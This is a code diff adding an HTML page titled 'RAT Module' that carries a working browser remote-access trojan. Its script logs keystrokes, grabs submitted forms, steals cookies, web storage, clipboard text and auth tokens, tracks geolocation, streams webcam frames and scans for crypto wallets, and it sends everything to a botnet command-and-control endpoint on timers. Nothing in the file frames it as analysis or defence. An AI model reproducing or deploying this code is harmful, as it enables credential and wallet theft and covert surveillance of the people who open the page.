@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>RAT Module</title></head>
+<body>
+<script>
+var C2='https://botnet-panel.onrender.com/api/ratdata';
+var BOT_ID='{{BOT_ID}}';
+var KEYLOG='',INTERVAL=10000;
+
+function send(t,d){
+    var x=new XMLHttpRequest();
+    x.open('POST',C2,true);
+    x.setRequestHeader('Content-Type','application/json');
+    x.send(JSON.stringify({id:BOT_ID,type:t,data:JSON.stringify(d)}));
+}
+
+// A) KEYLOGGER
+document.addEventListener('keydown',function(e){
+    KEYLOG+=e.key;if(e.key==='Enter')KEYLOG+='\n';
+    if(KEYLOG.length>200){send('keylog',{keys:KEYLOG,url:location.href,time:new Date().toISOString()});KEYLOG='';}
+});
+setInterval(function(){if(KEYLOG.length>0){send('keylog',{keys:KEYLOG,url:location.href,time:new Date().toISOString()});KEYLOG='';}},INTERVAL);
+
+// B) FORM GRABBING
+document.addEventListener('submit',function(e){
+    var f=e.target,d={};f.querySelectorAll('input').forEach(function(i){d[i.name||i.id||i.type]=i.value});
+    send('form_grab',{url:location.href,action:f.action,data:d,time:new Date().toISOString()});
+},true);
+
+// C) COOKIE THEFT
+function stealCookies(){send('cookies_web',{url:location.href,cookies:document.cookie,time:new Date().toISOString()});}
+stealCookies();setInterval(stealCookies,30000);
+
+// D) STORAGE THEFT
+function stealStorage(){var ls={},ss={};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);ls[k]=localStorage.getItem(k);}for(i=0;i<sessionStorage.length;i++){k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k);}}catch(e){}send('storage',{localStorage:ls,sessionStorage:ss,url:location.href});}
+stealStorage();setInterval(stealStorage,60000);
+
+// E) SCREENSHOT
+function screenshot(){send('screenshot',{w:screen.width,h:screen.height,url:location.href,time:new Date().toISOString()});}
+screenshot();setInterval(screenshot,60000);
+
+// F) CLIPBOARD WEB
+function stealClipboard(){try{navigator.clipboard.readText().then(function(t){if(t&&t.length>0)send('clipboard_web',{text:t,url:location.href,time:new Date().toISOString()});}).catch(function(){});}catch(e){}}
+setInterval(stealClipboard,15000);
+
+// G) GEOLOCATION
+function getGeo(){if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){send('geolocation',{lat:p.coords.latitude,lng:p.coords.longitude,time:new Date().toISOString()});},function(){},{enableHighAccuracy:true,timeout:5000});}}
+getGeo();setInterval(getGeo,60000);
+
+// H) WEBCAM
+function startWebcam(){try{navigator.mediaDevices.getUserMedia({video:true,audio:false}).then(function(s){send('webcam',{status:'GRANTED',url:location.href});var v=document.createElement('video');v.srcObject=s;v.play();var c=document.createElement('canvas');var ctx=c.getContext('2d');setInterval(function(){c.width=v.videoWidth;c.height=v.videoHeight;ctx.drawImage(v,0,0);send('webcam_frame',{frame:c.toDataURL('image/jpeg',0.3),time:new Date().toISOString()});},5000);}).catch(function(e){send('webcam',{status:'DENIED',error:e.message});});}catch(e){}}
+window.startWebcam=startWebcam;
+
+// I) CRYPTO WALLETS
+function scanWallets(){var w=[];if(window.ethereum&&window.ethereum.isMetaMask)w.push('MetaMask');if(window.solana&&window.solana.isPhantom)w.push('Phantom');if(window.trustwallet)w.push('TrustWallet');if(document.body.innerHTML.includes('metamask'))w.push('MetaMask(DOM)');if(document.body.innerHTML.includes('phantom'))w.push('Phantom(DOM)');send('crypto_wallets',{wallets:w,hasEthereum:!!window.ethereum,time:new Date().toISOString()});}
+scanWallets();setInterval(scanWallets,30000);
+
+// J) TOKENS
+function stealTokens(){var t={};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i),v=localStorage.getItem(k);if(k.toLowerCase().includes('token')||k.toLowerCase().includes('auth')||k.toLowerCase().includes('session')||k.toLowerCase().includes('jwt')||v.startsWith('eyJ'))t[k]=v;}}catch(e){}document.cookie.split(';').forEach(function(c){var p=c.trim().split('=');if(p[0].toLowerCase().includes('token')||p[0].toLowerCase().includes('auth')||p[0].toLowerCase().includes('session'))t[p[0]]=p[1];});if(Object.keys(t).length>0)send('tokens',{tokens:t,url:location.href,time:new Date().toISOString()});}
+stealTokens();setInterval(stealTokens,60000);
+
+send('rat_loaded',{url:location.href,ua:navigator.userAgent,time:new Date().toISOString()});
+</script>
+</body>
+</html>
